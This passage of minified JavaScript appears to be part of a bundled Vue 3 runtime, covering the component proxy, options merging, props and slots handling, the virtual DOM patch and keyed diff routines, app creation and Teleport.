a=Ur(l,!1);if(a&&(a===t||a===Vt(t)||a===Yo(Vt(t))))return l}const i=Fi(r[e]||l[e],t)||Fi(r.appContext[e],t);return!i&&o?l:i}}function Fi(e,t){return e&&(e[t]||e[Vt(t)]||e[Yo(Vt(t))])}function no(e,t,s,o){let r;const l=s&&s[o];if(oe(e)||je(e)){r=new Array(e.length);for(let i=0,a=e.length;i<a;i++)r[i]=t(e[i],i,void 0,l&&l[i])}else if(typeof e=="number"){r=new Array(e);for(let i=0;i<e;i++)r[i]=t(i+1,i,void 0,l&&l[i])}else if(Re(e))if(e[Symbol.iterator])r=Array.from(e,(i,a)=>t(i,a,void 0,l&&l[a]));else{const i=Object.keys(e);r=new Array(i.length);for(let a=0,c=i.length;a<c;a++){const u=i[a];r[a]=t(e[u],u,a,l&&l[a])}}else r=[];return s&&(s[o]=r),r}function Ut(e,t,s={},o,r){if(tt.isCE||tt.parent&&ts(tt.parent)&&tt.parent.isCE)return C("slot",t==="default"?null:{name:t},o&&o());let l=e[t];l&&l._c&&(l._d=!1),_();const i=l&&mu(l(s)),a=Y(Se,{key:s.key||i&&i.key||`_${t}`},i||(o?o():[]),i&&e._===1?64:-2);return!r&&a.scopeId&&(a.slotScopeIds=[a.scopeId+"-s"]),l&&l._c&&(l._d=!0),a}function mu(e){return e.some(t=>rs(t)?!(t.type===mn||t.type===Se&&!mu(t.children)):!0)?e:null}const Nr=e=>e?Au(e)?sr(e)||e.proxy:Nr(e.parent):null,Fo=at(Object.create(null),{$:e=>e,$el:e=>e.vnode.el,$data:e=>e.data,$props:e=>e.props,$attrs:e=>e.attrs,$slots:e=>e.slots,$refs:e=>e.refs,$parent:e=>Nr(e.parent),$root:e=>Nr(e.root),$emit:e=>e.emit,$options:e=>jl(e),$forceUpdate:e=>e.f||(e.f=()=>Rl(e.update)),$nextTick:e=>e.n||(e.n=et.bind(e.proxy)),$watch:e=>bf.bind(e)}),Of={get({_:e},t){const{ctx:s,setupState:o,data:r,props:l,accessCache:i,type:a,appContext:c}=e;let u;if(t[0]!=="$"){const m=i[t];if(m!==void 0)switch(m){case 1:return o[t];case 2:return r[t];case 4:return s[t];case 3:return l[t]}else{if(o!==Oe&&ve(o,t))return i[t]=1,o[t];if(r!==Oe&&ve(r,t))return i[t]=2,r[t];if((u=e.propsOptions[0])&&ve(u,t))return i[t]=3,l[t];if(s!==Oe&&ve(s,t))return i[t]=4,s[t];qr&&(i[t]=0)}}const d=Fo[t];let p,f;if(d)return t==="$attrs"&&xt(e,"get",t),d(e);if((p=a.__cssModules)&&(p=p[t]))return p;if(s!==Oe&&ve(s,t))return i[t]=4,s[t];if(f=c.config.globalProperties,ve(f,t))return f[t]},set({_:e},t,s){const{data:o,setupState:r,ctx:l}=e;return r!==Oe&&ve(r,t)?(r[t]=s,!0):o!==Oe&&ve(o,t)?(o[t]=s,!0):ve(e.props,t)||t[0]==="$"&&t.slice(1)in e?!1:(l[t]=s,!0)},has({_:{data:e,setupState:t,accessCache:s,ctx:o,appContext:r,propsOptions:l}},i){let a;return!!s[i]||e!==Oe&&ve(e,i)||t!==Oe&&ve(t,i)||(a=l[0])&&ve(a,i)||ve(o,i)||ve(Fo,i)||ve(r.config.globalProperties,i)},defineProperty(e,t,s){return s.get!=null?e._.accessCache[t]=0:ve(s,"value")&&this.set(e,t,s.value,null),Reflect.defineProperty(e,t,s)}};let qr=!0;function If(e){const t=jl(e),s=e.proxy,o=e.ctx;qr=!1,t.beforeCreate&&Oi(t.beforeCreate,e,"bc");const{data:r,computed:l,methods:i,watch:a,provide:c,inject:u,created:d,beforeMount:p,mounted:f,beforeUpdate:m,updated:h,activated:x,deactivated:b,beforeDestroy:k,beforeUnmount:S,destroyed:E,unmounted:B,render:L,renderTracked:P,renderTriggered:H,errorCaptured:te,serverPrefetch:le,expose:ye,inheritAttrs:_e,components:ze,directives:Ve,filters:qe}=t;if(u&&Tf(u,o,null,e.appContext.config.unwrapInjectedRef),i)for(const Q in i){const se=i[Q];ce(se)&&(o[Q]=se.bind(s))}if(r){const Q=r.call(s,s);Re(Q)&&(e.data=Me(Q))}if(qr=!0,l)for(const Q in l){const se=l[Q],fe=ce(se)?se.bind(s,s):ce(se.get)?se.get.bind(s,s):Ft,De=!ce(se)&&ce(se.set)?se.set.bind(s):Ft,dt=D({get:fe,set:De});Object.defineProperty(o,Q,{enumerable:!0,configurable:!0,get:()=>dt.value,set:Ge=>dt.value=Ge})}if(a)for(const Q in a)hu(a[Q],o,s,Q);if(c){const Q=ce(c)?c.call(s):c;Reflect.ownKeys(Q).forEach(se=>{yt(se,Q[se])})}d&&Oi(d,e,"c");function Le(Q,se){oe(se)?se.forEach(fe=>Q(fe.bind(s))):se&&Q(se.bind(s))}if(Le(du,p),Le(ps,f),Le(Sf,m),Le(ql,h),Le(wf,x),Le(Ef,b),Le(Df,te),Le($f,P),Le(Cf,H),Le(er,S),Le(tr,B),Le(kf,le),oe(ye))if(ye.length){const Q=e.exposed||(e.exposed={});ye.forEach(se=>{Object.defineProperty(Q,se,{get:()=>s[se],set:fe=>s[se]=fe})})}else e.exposed||(e.exposed={});L&&e.render===Ft&&(e.render=L),_e!=null&&(e.inheritAttrs=_e),ze&&(e.components=ze),Ve&&(e.directives=Ve)}function Tf(e,t,s=Ft,o=!1){oe(e)&&(e=jr(e));for(const r in e){const l=e[r];let i;Re(l)?"default"in l?i=N(l.from||r,l.default,!0):i=N(l.from||r):i=N(l),ke(i)&&o?Object.defineProperty(t,r,{enumerable:!0,configurable:!0,get:()=>i.value,set:a=>i.value=a}):t[r]=i}}function Oi(e,t,s){Ot(oe(e)?e.map(o=>o.bind(t.proxy)):e.bind(t.proxy),t,s)}function hu(e,t,s,o){const r=o.includes(".")?lu(s,o):()=>s[o];if(je(e)){const l=t[e];ce(l)&&me(r,l)}else if(ce(e))me(r,e.bind(s));else if(Re(e))if(oe(e))e.forEach(l=>hu(l,t,s,o));else{const l=ce(e.handler)?e.handler.bind(s):t[e.handler];ce(l)&&me(r,l,e)}}function jl(e){const t=e.type,{mixins:s,extends:o}=t,{mixins:r,optionsCache:l,config:{optionMergeStrategies:i}}=e.appContext,a=l.get(t);let c;return a?c=a:!r.length&&!s&&!o?c=t:(c={},r.length&&r.forEach(u=>Oo(c,u,i,!0)),Oo(c,t,i)),Re(t)&&l.set(t,c),c}function Oo(e,t,s,o=!1){const{mixins:r,extends:l}=t;l&&Oo(e,l,s,!0),r&&r.forEach(i=>Oo(e,i,s,!0));for(const i in t)if(!(o&&i==="expose")){const a=Pf[i]||s&&s[i];e[i]=a?a(e[i],t[i]):t[i]}return e}const Pf={data:Ii,props:wn,emits:wn,methods:wn,computed:wn,beforeCreate:ot,created:ot,beforeMount:ot,mounted:ot,beforeUpdate:ot,updated:ot,beforeDestroy:ot,beforeUnmount:ot,destroyed:ot,unmounted:ot,activated:ot,deactivated:ot,errorCaptured:ot,serverPrefetch:ot,components:wn,directives:wn,watch:Lf,provide:Ii,inject:Mf};function Ii(e,t){return t?e?function(){return at(ce(e)?e.call(this,this):e,ce(t)?t.call(this,this):t)}:t:e}function Mf(e,t){return wn(jr(e),jr(t))}function jr(e){if(oe(e)){const t={};for(let s=0;s<e.length;s++)t[e[s]]=e[s];return t}return e}function ot(e,t){return e?[...new Set([].concat(e,t))]:t}function wn(e,t){return e?at(at(Object.create(null),e),t):t}function Lf(e,t){if(!e)return t;if(!t)return e;const s=at(Object.create(null),e);for(const o in t)s[o]=ot(e[o],t[o]);return s}function Rf(e,t,s,o=!1){const r={},l={};Co(l,nr,1),e.propsDefaults=Object.create(null),gu(e,t,r,l);for(const i in e.propsOptions[0])i in r||(r[i]=void 0);s?e.props=o?r:Jp(r):e.type.props?e.props=r:e.props=l,e.attrs=l}function Nf(e,t,s,o){const{props:r,attrs:l,vnode:{patchFlag:i}}=e,a=Ee(r),[c]=e.propsOptions;let u=!1;if((o||i>0)&&!(i&16)){if(i&8){const d=e.vnode.dynamicProps;for(let p=0;p<d.length;p++){let f=d[p];if(Zo(e.emitsOptions,f))continue;const m=t[f];if(c)if(ve(l,f))m!==l[f]&&(l[f]=m,u=!0);else{const h=Vt(f);r[h]=Hr(c,a,h,m,e,!1)}else m!==l[f]&&(l[f]=m,u=!0)}}}else{gu(e,t,r,l)&&(u=!0);let d;for(const p in a)(!t||!ve(t,p)&&((d=Rn(p))===p||!ve(t,d)))&&(c?s&&(s[p]!==void 0||s[d]!==void 0)&&(r[p]=Hr(c,a,p,void 0,e,!0)):delete r[p]);if(l!==a)for(const p in l)(!t||!ve(t,p)&&!0)&&(delete l[p],u=!0)}u&&Zt(e,"set","$attrs")}function gu(e,t,s,o){const[r,l]=e.propsOptions;let i=!1,a;if(t)for(let c in t){if(_o(c))continue;const u=t[c];let d;r&&ve(r,d=Vt(c))?!l||!l.includes(d)?s[d]=u:(a||(a={}))[d]=u:Zo(e.emitsOptions,c)||(!(c in o)||u!==o[c])&&(o[c]=u,i=!0)}if(l){const c=Ee(s),u=a||Oe;for(let d=0;d<l.length;d++){const p=l[d];s[p]=Hr(r,c,p,u[p],e,!ve(u,p))}}return i}function Hr(e,t,s,o,r,l){const i=e[s];if(i!=null){const a=ve(i,"default");if(a&&o===void 0){const c=i.default;if(i.type!==Function&&ce(c)){const{propsDefaults:u}=r;s in u?o=u[s]:(ls(r),o=u[s]=c.call(null,t),In())}else o=c}i[0]&&(l&&!a?o=!1:i[1]&&(o===""||o===Rn(s))&&(o=!0))}return o}function yu(e,t,s=!1){const o=t.propsCache,r=o.get(e);if(r)return r;const l=e.props,i={},a=[];let c=!1;if(!ce(e)){const d=p=>{c=!0;const[f,m]=yu(p,t,!0);at(i,f),m&&a.push(...m)};!s&&t.mixins.length&&t.mixins.forEach(d),e.extends&&d(e.extends),e.mixins&&e.mixins.forEach(d)}if(!l&&!c)return Re(e)&&o.set(e,Qn),Qn;if(oe(l))for(let d=0;d<l.length;d++){const p=Vt(l[d]);Ti(p)&&(i[p]=Oe)}else if(l)for(const d in l){const p=Vt(d);if(Ti(p)){const f=l[d],m=i[p]=oe(f)||ce(f)?{type:f}:f;if(m){const h=Li(Boolean,m.type),x=Li(String,m.type);m[0]=h>-1,m[1]=x<0||h<x,(h>-1||ve(m,"default"))&&a.push(p)}}}const u=[i,a];return Re(e)&&o.set(e,u),u}function Ti(e){return e[0]!=="$"}function Pi(e){const t=e&&e.toString().match(/^\s*function (\w+)/);return t?t[1]:e===null?"null":""}function Mi(e,t){return Pi(e)===Pi(t)}function Li(e,t){return oe(t)?t.findIndex(s=>Mi(s,e)):ce(t)&&Mi(t,e)?0:-1}const vu=e=>e[0]==="_"||e==="$stable",Hl=e=>oe(e)?e.map(Nt):[Nt(e)],qf=(e,t,s)=>{if(t._n)return t;const o=X((...r)=>Hl(t(...r)),s);return o._c=!1,o},_u=(e,t,s)=>{const o=e._ctx;for(const r in e){if(vu(r))continue;const l=e[r];if(ce(l))t[r]=qf(r,l,o);else if(l!=null){const i=Hl(l);t[r]=()=>i}}},bu=(e,t)=>{const s=Hl(t);e.slots.default=()=>s},jf=(e,t)=>{if(e.vnode.shapeFlag&32){const s=t._;s?(e.slots=Ee(t),Co(t,"_",s)):_u(t,e.slots={})}else e.slots={},t&&bu(e,t);Co(e.slots,nr,1)},Hf=(e,t,s)=>{const{vnode:o,slots:r}=e;let l=!0,i=Oe;if(o.shapeFlag&32){const a=t._;a?s&&a===1?l=!1:(at(r,t),!s&&a===1&&delete r._):(l=!t.$stable,_u(t,r)),i=t}else t&&(bu(e,t),i={default:1});if(l)for(const a in r)!vu(a)&&!(a in i)&&delete r[a]};function xu(){return{app:null,config:{isNativeTag:_p,performance:!1,globalProperties:{},optionMergeStrategies:{},errorHandler:void 0,warnHandler:void 0,compilerOptions:{}},mixins:[],components:{},directives:{},provides:Object.create(null),optionsCache:new WeakMap,propsCache:new WeakMap,emitsCache:new WeakMap}}let zf=0;function Vf(e,t){return function(o,r=null){ce(o)||(o=Object.assign({},o)),r!=null&&!Re(r)&&(r=null);const l=xu(),i=new Set;let a=!1;const c=l.app={_uid:zf++,_component:o,_props:r,_container:null,_context:l,_instance:null,version:um,get config(){return l.config},set config(u){},use(u,...d){return i.has(u)||(u&&ce(u.install)?(i.add(u),u.install(c,...d)):ce(u)&&(i.add(u),u(c,...d))),c},mixin(u){return l.mixins.includes(u)||l.mixins.push(u),c},component(u,d){return d?(l.components[u]=d,c):l.components[u]},directive(u,d){return d?(l.directives[u]=d,c):l.directives[u]},mount(u,d,p){if(!a){const f=C(o,r);return f.appContext=l,d&&t?t(f,u):e(f,u,p),a=!0,c._container=u,u.__vue_app__=c,sr(f.component)||f.component.proxy}},unmount(){a&&(e(null,c._container),delete c._container.__vue_app__)},provide(u,d){return l.provides[u]=d,c}};return c}}function zr(e,t,s,o,r=!1){if(oe(e)){e.forEach((f,m)=>zr(f,t&&(oe(t)?t[m]:t),s,o,r));return}if(ts(o)&&!r)return;const l=o.shapeFlag&4?sr(o.component)||o.component.proxy:o.el,i=r?null:l,{i:a,r:c}=e,u=t&&t.r,d=a.refs===Oe?a.refs={}:a.refs,p=a.setupState;if(u!=null&&u!==c&&(je(u)?(d[u]=null,ve(p,u)&&(p[u]=null)):ke(u)&&(u.value=null)),ce(c))an(c,a,12,[i,d]);else{const f=je(c),m=ke(c);if(f||m){const h=()=>{if(e.f){const x=f?d[c]:c.value;r?oe(x)&&Sl(x,l):oe(x)?x.includes(l)||x.push(l):f?(d[c]=[l],ve(p,c)&&(p[c]=d[c])):(c.value=[l],e.k&&(d[e.k]=c.value))}else f?(d[c]=i,ve(p,c)&&(p[c]=i)):m&&(c.value=i,e.k&&(d[e.k]=i))};i?(h.id=-1,Xe(h,s)):h()}}}const Xe=_f;function Uf(e){return Wf(e)}function Wf(e,t){const s=Sp();s.__VUE__=!0;const{insert:o,remove:r,patchProp:l,createElement:i,createText:a,createComment:c,setText:u,setElementText:d,parentNode:p,nextSibling:f,setScopeId:m=Ft,cloneNode:h,insertStaticContent:x}=e,b=(g,v,A,I=null,O=null,R=null,V=!1,M=null,j=!!v.dynamicChildren)=>{if(g===v)return;g&&!_s(g,v)&&(I=G(g),ct(g,O,R,!0),g=null),v.patchFlag===-2&&(j=!1,v.dynamicChildren=null);const{type:T,ref:J,shapeFlag:Z}=v;switch(T){case Vl:k(g,v,A,I);break;case mn:S(g,v,A,I);break;case bo:g==null&&E(v,A,I,V);break;case Se:Ve(g,v,A,I,O,R,V,M,j);break;default:Z&1?P(g,v,A,I,O,R,V,M,j):Z&6?qe(g,v,A,I,O,R,V,M,j):(Z&64||Z&128)&&T.process(g,v,A,I,O,R,V,M,j,ge)}J!=null&&O&&zr(J,g&&g.ref,R,v||g,!v)},k=(g,v,A,I)=>{if(g==null)o(v.el=a(v.children),A,I);else{const O=v.el=g.el;v.children!==g.children&&u(O,v.children)}},S=(g,v,A,I)=>{g==null?o(v.el=c(v.children||""),A,I):v.el=g.el},E=(g,v,A,I)=>{[g.el,g.anchor]=x(g.children,v,A,I,g.el,g.anchor)},B=({el:g,anchor:v},A,I)=>{let O;for(;g&&g!==v;)O=f(g),o(g,A,I),g=O;o(v,A,I)},L=({el:g,anchor:v})=>{let A;for(;g&&g!==v;)A=f(g),r(g),g=A;r(v)},P=(g,v,A,I,O,R,V,M,j)=>{V=V||v.type==="svg",g==null?H(v,A,I,O,R,V,M,j):ye(g,v,O,R,V,M,j)},H=(g,v,A,I,O,R,V,M)=>{let j,T;const{type:J,props:Z,shapeFlag:ee,transition:re,patchFlag:be,dirs:Be}=g;if(g.el&&h!==void 0&&be===-1)j=g.el=h(g.el);else{if(j=g.el=i(g.type,R,Z&&Z.is,Z),ee&8?d(j,g.children):ee&16&&le(g.children,j,null,I,O,R&&J!=="foreignObject",V,M),Be&&vn(g,null,I,"created"),Z){for(const Te in Z)Te!=="value"&&!_o(Te)&&l(j,Te,null,Z[Te],R,g.children,I,O,q);"value"in Z&&l(j,"value",null,Z.value),(T=Z.onVnodeBeforeMount)&&wt(T,I,g)}te(j,g,g.scopeId,V,I)}Be&&vn(g,null,I,"beforeMount");const Fe=(!O||O&&!O.pendingBranch)&&re&&!re.persisted;Fe&&re.beforeEnter(j),o(j,v,A),((T=Z&&Z.onVnodeMounted)||Fe||Be)&&Xe(()=>{T&&wt(T,I,g),Fe&&re.enter(j),Be&&vn(g,null,I,"mounted")},O)},te=(g,v,A,I,O)=>{if(A&&m(g,A),I)for(let R=0;R<I.length;R++)m(g,I[R]);if(O){let R=O.subTree;if(v===R){const V=O.vnode;te(g,V,V.scopeId,V.slotScopeIds,O.parent)}}},le=(g,v,A,I,O,R,V,M,j=0)=>{for(let T=j;T<g.length;T++){const J=g[T]=M?sn(g[T]):Nt(g[T]);b(null,J,v,A,I,O,R,V,M)}},ye=(g,v,A,I,O,R,V)=>{const M=v.el=g.el;let{patchFlag:j,dynamicChildren:T,dirs:J}=v;j|=g.patchFlag&16;const Z=g.props||Oe,ee=v.props||Oe;let re;A&&_n(A,!1),(re=ee.onVnodeBeforeUpdate)&&wt(re,A,v,g),J&&vn(v,g,A,"beforeUpdate"),A&&_n(A,!0);const be=O&&v.type!=="foreignObject";if(T?_e(g.dynamicChildren,T,M,A,I,be,R):V||fe(g,v,M,null,A,I,be,R,!1),j>0){if(j&16)ze(M,v,Z,ee,A,I,O);else if(j&2&&Z.class!==ee.class&&l(M,"class",null,ee.class,O),j&4&&l(M,"style",Z.style,ee.style,O),j&8){const Be=v.dynamicProps;for(let Fe=0;Fe<Be.length;Fe++){const Te=Be[Fe],St=Z[Te],jn=ee[Te];(jn!==St||Te==="value")&&l(M,Te,St,jn,O,g.children,A,I,q)}}j&1&&g.children!==v.children&&d(M,v.children)}else!V&&T==null&&ze(M,v,Z,ee,A,I,O);((re=ee.onVnodeUpdated)||J)&&Xe(()=>{re&&wt(re,A,v,g),J&&vn(v,g,A,"updated")},I)},_e=(g,v,A,I,O,R,V)=>{for(let M=0;M<v.length;M++){const j=g[M],T=v[M],J=j.el&&(j.type===Se||!_s(j,T)||j.shapeFlag&70)?p(j.el):A;b(j,T,J,null,I,O,R,V,!0)}},ze=(g,v,A,I,O,R,V)=>{if(A!==I){for(const M in I){if(_o(M))continue;const j=I[M],T=A[M];j!==T&&M!=="value"&&l(g,M,T,j,V,v.children,O,R,q)}if(A!==Oe)for(const M in A)!_o(M)&&!(M in I)&&l(g,M,A[M],null,V,v.children,O,R,q);"value"in I&&l(g,"value",A.value,I.value)}},Ve=(g,v,A,I,O,R,V,M,j)=>{const T=v.el=g?g.el:a(""),J=v.anchor=g?g.anchor:a("");let{patchFlag:Z,dynamicChildren:ee,slotScopeIds:re}=v;re&&(M=M?M.concat(re):re),g==null?(o(T,A,I),o(J,A,I),le(v.children,A,J,O,R,V,M,j)):Z>0&&Z&64&&ee&&g.dynamicChildren?(_e(g.dynamicChildren,ee,A,O,R,V,M),(v.key!=null||O&&v===O.subTree)&&zl(g,v,!0)):fe(g,v,A,J,O,R,V,M,j)},qe=(g,v,A,I,O,R,V,M,j)=>{v.slotScopeIds=M,g==null?v.shapeFlag&512?O.ctx.activate(v,A,I,V,j):Ie(v,A,I,O,R,V,j):Le(g,v,j)},Ie=(g,v,A,I,O,R,V)=>{const M=g.component=sm(g,I,O);if(au(g)&&(M.ctx.renderer=ge),om(M),M.asyncDep){if(O&&O.registerDep(M,Q),!g.el){const j=M.subTree=C(mn);S(null,j,v,A)}return}Q(M,g,v,A,O,R,V)},Le=(g,v,A)=>{const I=v.component=g.component;if(yf(g,v,A))if(I.asyncDep&&!I.asyncResolved){se(I,v,A);return}else I.next=v,df(I.update),I.update();else v.el=g.el,I.vnode=v},Q=(g,v,A,I,O,R,V)=>{const M=()=>{if(g.isMounted){let{next:J,bu:Z,u:ee,parent:re,vnode:be}=g,Be=J,Fe;_n(g,!1),J?(J.el=be.el,se(g,J,V)):J=be,Z&&Gn(Z),(Fe=J.props&&J.props.onVnodeBeforeUpdate)&&wt(Fe,re,J,be),_n(g,!0);const Te=cr(g),St=g.subTree;g.subTree=Te,b(St,Te,p(St.el),G(St),g,O,R),J.el=Te.el,Be===null&&vf(g,Te.el),ee&&Xe(ee,O),(Fe=J.props&&J.props.onVnodeUpdated)&&Xe(()=>wt(Fe,re,J,be),O)}else{let J;const{el:Z,props:ee}=v,{bm:re,m:be,parent:Be}=g,Fe=ts(v);if(_n(g,!1),re&&Gn(re),!Fe&&(J=ee&&ee.onVnodeBeforeMount)&&wt(J,Be,v),_n(g,!0),Z&&ne){const Te=()=>{g.subTree=cr(g),ne(Z,g.subTree,g,O,null)};Fe?v.type.__asyncLoader().then(()=>!g.isUnmounted&&Te()):Te()}else{const Te=g.subTree=cr(g);b(null,Te,A,I,g,O,R),v.el=Te.el}if(be&&Xe(be,O),!Fe&&(J=ee&&ee.onVnodeMounted)){const Te=v;Xe(()=>wt(J,Be,Te),O)}(v.shapeFlag&256||Be&&ts(Be.vnode)&&Be.vnode.shapeFlag&256)&&g.a&&Xe(g.a,O),g.isMounted=!0,v=A=I=null}},j=g.effect=new Dl(M,()=>Rl(T),g.scope),T=g.update=()=>j.run();T.id=g.uid,_n(g,!0),T()},se=(g,v,A)=>{v.component=g;const I=g.vnode.props;g.vnode=v,g.next=null,Nf(g,v.props,I,A),Hf(g,v.children,A),us(),$i(),ds()},fe=(g,v,A,I,O,R,V,M,j=!1)=>{const T=g&&g.children,J=g?g.shapeFlag:0,Z=v.children,{patchFlag:ee,shapeFlag:re}=v;if(ee>0){if(ee&128){dt(T,Z,A,I,O,R,V,M,j);return}else if(ee&256){De(T,Z,A,I,O,R,V,M,j);return}}re&8?(J&16&&q(T,O,R),Z!==T&&d(A,Z)):J&16?re&16?dt(T,Z,A,I,O,R,V,M,j):q(T,O,R,!0):(J&8&&d(A,""),re&16&&le(Z,A,I,O,R,V,M,j))},De=(g,v,A,I,O,R,V,M,j)=>{g=g||Qn,v=v||Qn;const T=g.length,J=v.length,Z=Math.min(T,J);let ee;for(ee=0;ee<Z;ee++){const re=v[ee]=j?sn(v[ee]):Nt(v[ee]);b(g[ee],re,A,null,O,R,V,M,j)}T>J?q(g,O,R,!0,!1,Z):le(v,A,I,O,R,V,M,j,Z)},dt=(g,v,A,I,O,R,V,M,j)=>{let T=0;const J=v.length;let Z=g.length-1,ee=J-1;for(;T<=Z&&T<=ee;){const re=g[T],be=v[T]=j?sn(v[T]):Nt(v[T]);if(_s(re,be))b(re,be,A,null,O,R,V,M,j);else break;T++}for(;T<=Z&&T<=ee;){const re=g[Z],be=v[ee]=j?sn(v[ee]):Nt(v[ee]);if(_s(re,be))b(re,be,A,null,O,R,V,M,j);else break;Z--,ee--}if(T>Z){if(T<=ee){const re=ee+1,be=re<J?v[re].el:I;for(;T<=ee;)b(null,v[T]=j?sn(v[T]):Nt(v[T]),A,be,O,R,V,M,j),T++}}else if(T>ee)for(;T<=Z;)ct(g[T],O,R,!0),T++;else{const re=T,be=T,Be=new Map;for(T=be;T<=ee;T++){const pt=v[T]=j?sn(v[T]):Nt(v[T]);pt.key!=null&&Be.set(pt.key,T)}let Fe,Te=0;const St=ee-be+1;let jn=!1,yi=0;const vs=new Array(St);for(T=0;T<St;T++)vs[T]=0;for(T=re;T<=Z;T++){const pt=g[T];if(Te>=St){ct(pt,O,R,!0);continue}let Rt;if(pt.key!=null)Rt=Be.get(pt.key);else for(Fe=be;Fe<=ee;Fe++)if(vs[Fe-be]===0&&_s(pt,v[Fe])){Rt=Fe;break}Rt===void 0?ct(pt,O,R,!0):(vs[Rt-be]=T+1,Rt>=yi?yi=Rt:jn=!0,b(pt,v[Rt],A,null,O,R,V,M,j),Te++)}const vi=jn?Yf(vs):Qn;for(Fe=vi.length-1,T=St-1;T>=0;T--){const pt=be+T,Rt=v[pt],_i=pt+1<J?v[pt+1].el:I;vs[T]===0?b(null,Rt,A,_i,O,R,V,M,j):jn&&(Fe<0||T!==vi[Fe]?Ge(Rt,A,_i,2):Fe--)}}},Ge=(g,v,A,I,O=null)=>{const{el:R,type:V,transition:M,children:j,shapeFlag:T}=g;if(T&6){Ge(g.component.subTree,v,A,I);return}if(T&128){g.suspense.move(v,A,I);return}if(T&64){V.move(g,v,A,ge);return}if(V===Se){o(R,v,A);for(let Z=0;Z<j.length;Z++)Ge(j[Z],v,A,I);o(g.anchor,v,A);return}if(V===bo){B(g,v,A);return}if(I!==2&&T&1&&M)if(I===0)M.beforeEnter(R),o(R,v,A),Xe(()=>M.enter(R),O);else{const{leave:Z,delayLeave:ee,afterLeave:re}=M,be=()=>o(R,v,A),Be=()=>{Z(R,()=>{be(),re&&re()})};ee?ee(R,be,Be):Be()}else o(R,v,A)},ct=(g,v,A,I=!1,O=!1)=>{const{type:R,props:V,ref:M,children:j,dynamicChildren:T,shapeFlag:J,patchFlag:Z,dirs:ee}=g;if(M!=null&&zr(M,null,A,g,!0),J&256){v.ctx.deactivate(g);return}const re=J&1&&ee,be=!ts(g);let Be;if(be&&(Be=V&&V.onVnodeBeforeUnmount)&&wt(Be,v,g),J&6)K(g.component,A,I);else{if(J&128){g.suspense.unmount(A,I);return}re&&vn(g,null,v,"beforeUnmount"),J&64?g.type.remove(g,v,A,O,ge,I):T&&(R!==Se||Z>0&&Z&64)?q(T,v,A,!1,!0):(R===Se&&Z&384||!O&&J&16)&&q(j,v,A),I&&yn(g)}(be&&(Be=V&&V.onVnodeUnmounted)||re)&&Xe(()=>{Be&&wt(Be,v,g),re&&vn(g,null,v,"unmounted")},A)},yn=g=>{const{type:v,el:A,anchor:I,transition:O}=g;if(v===Se){F(A,I);return}if(v===bo){L(g);return}const R=()=>{r(A),O&&!O.persisted&&O.afterLeave&&O.afterLeave()};if(g.shapeFlag&1&&O&&!O.persisted){const{leave:V,delayLeave:M}=O,j=()=>V(A,R);M?M(g.el,R,j):j()}else R()},F=(g,v)=>{let A;for(;g!==v;)A=f(g),r(g),g=A;r(v)},K=(g,v,A)=>{const{bum:I,scope:O,update:R,subTree:V,um:M}=g;I&&Gn(I),O.stop(),R&&(R.active=!1,ct(V,g,v,A)),M&&Xe(M,v),Xe(()=>{g.isUnmounted=!0},v),v&&v.pendingBranch&&!v.isUnmounted&&g.asyncDep&&!g.asyncResolved&&g.suspenseId===v.pendingId&&(v.deps--,v.deps===0&&v.resolve())},q=(g,v,A,I=!1,O=!1,R=0)=>{for(let V=R;V<g.length;V++)ct(g[V],v,A,I,O)},G=g=>g.shapeFlag&6?G(g.component.subTree):g.shapeFlag&128?g.suspense.next():f(g.anchor||g.el),xe=(g,v,A)=>{g==null?v._vnode&&ct(v._vnode,null,null,!0):b(v._vnode||null,g,v,null,null,null,A),$i(),nu(),v._vnode=g},ge={p:b,um:ct,m:Ge,r:yn,mt:Ie,mc:le,pc:fe,pbc:_e,n:G,o:e};let ie,ne;return t&&([ie,ne]=t(ge)),{render:xe,hydrate:ie,createApp:Vf(xe,ie)}}function _n({effect:e,update:t},s){e.allowRecurse=t.allowRecurse=s}function zl(e,t,s=!1){const o=e.children,r=t.children;if(oe(o)&&oe(r))for(let l=0;l<o.length;l++){const i=o[l];let a=r[l];a.shapeFlag&1&&!a.dynamicChildren&&((a.patchFlag<=0||a.patchFlag===32)&&(a=r[l]=sn(r[l]),a.el=i.el),s||zl(i,a))}}function Yf(e){const t=e.slice(),s=[0];let o,r,l,i,a;const c=e.length;for(o=0;o<c;o++){const u=e[o];if(u!==0){if(r=s[s.length-1],e[r]<u){t[o]=r,s.push(o);continue}for(l=0,i=s.length-1;l<i;)a=l+i>>1,e[s[a]]<u?l=a+1:i=a;u<e[s[l]]&&(l>0&&(t[o]=s[l-1]),s[l]=o)}}for(l=s.length,i=s[l-1];l-- >0;)s[l]=i,i=t[i];return s}const Kf=e=>e.__isTeleport,Ds=e=>e&&(e.disabled||e.disabled===""),Ri=e=>typeof SVGElement<"u"&&e instanceof SVGElement,Vr=(e,t)=>{const s=e&&e.to;return je(s)?t?t(s):null:s},Xf={__isTeleport:!0,process(e,t,s,o,r,l,i,a,c,u){const{mc:d,pc:p,pbc:f,o:{insert:m,querySelector:h,createText:x,createComment:b}}=u,k=Ds(t.props);let{shapeFlag:S,children:E,dynamicChildren:B}=t;if(e==null){const L=t.el=x(""),P=t.anchor=x("");m(L,s,o),m(P,s,o);const H=t.target=Vr(t.props,h),te=t.targetAnchor=x("");H&&(m(te,H),i=i||Ri(H));const le=(ye,_e)=>{S&16&&d(E,ye,_e,r,l,i,a,c)};k?le(s,P):H&&le(H,te)}else{t.el=e.el;const L=t.anchor=e.anchor,P=t.target=e.target,H=t.targetAnchor=e.targetAnchor,te=Ds(e.props),le=te?s:P,ye=te?L:H;if(i=i||Ri(P),B?(f(e.dynamicChildren,B,le,r,l,i,a),zl(e,t,!0)):c||p(e,t,le,ye,r,l,i,a,!1),k)te||mo(t,s,L,u,1);else if((t.props&&t.props.to)!==(e.props&&e.props.to)){const _e=t.target=Vr(t.props,h);_e&&mo(t,_e,null,u,0)}else te&&mo(t,P,H,u,1)}},remove(e,t,s,o,{um:r,o:{remove:l}},i){const{shapeFlag:a,children:c,anchor:u,targetAnchor:d,target:p,props:f}=e;if(p&&l(d),(i||!Ds(f))&&(l(u),a&16))for(let m=0;m<c.length;m++){const h=c[m];r(h,t,s,!0,!!h.dynamicChildren)}},move:mo,hydrate:Qf};function mo(e,t,s,{o:{insert:o},m:r},l=2){l===0&&o(e.targetAnchor,t,s);const{el:i,anchor:a,shapeFlag:c,children:u,props:d}=e,p=l===2;if(p&&o(i,t,s),(!p||Ds(d))&&c&16)for(let f=0;f<u.length;f++)r(u[f],t,s,2);p&&o(a,t,s)}function Qf(e,t,s,o,r,l,{o:{nextSibling:i,parentNode:a,querySelector:c}},u){const 